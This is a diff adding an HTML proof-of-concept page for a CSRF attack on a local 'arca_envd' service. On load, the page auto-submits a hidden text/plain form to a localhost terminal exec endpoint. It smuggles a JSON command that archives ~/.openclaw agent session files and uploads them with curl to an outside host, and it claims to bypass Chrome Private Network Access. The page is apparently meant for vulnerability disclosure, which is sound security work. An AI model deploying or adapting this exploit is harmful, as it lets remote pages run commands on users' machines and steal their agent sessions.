@@ -1,0 +1,25 @@
+<!doctype html>
+<html>
+  <head>
+    <title>CSRF PoC - arca_envd</title>
+  </head>
+  <body>
+    <h3>arca_envd CSRF PoC</h3>
+    <p>Top-level form navigation to bypass Chrome Private Network Access...</p>
+    <form
+      method="POST"
+      action="http://127.0.0.1:11452/terminal/exec_command"
+      enctype="text/plain"
+      id="f"
+    >
+      <input
+        type="hidden"
+        name='{"session_id":"019d4882-d81d-7acb-9fb6-21b379c78595","command":"tar -czf ~/sessions_backup.tar.gz -C ~/.openclaw/agents/main sessions && curl -X POST -F \"file=@/home/admin/sessions_backup.tar.gz\" http://ip:8691/upload","timeout_in_millis":5000,"x":"'
+        value='"}'
+      />
+    </form>
+    <script>
+      document.getElementById("f").submit()
+    </script>
+  </body>
+</html>
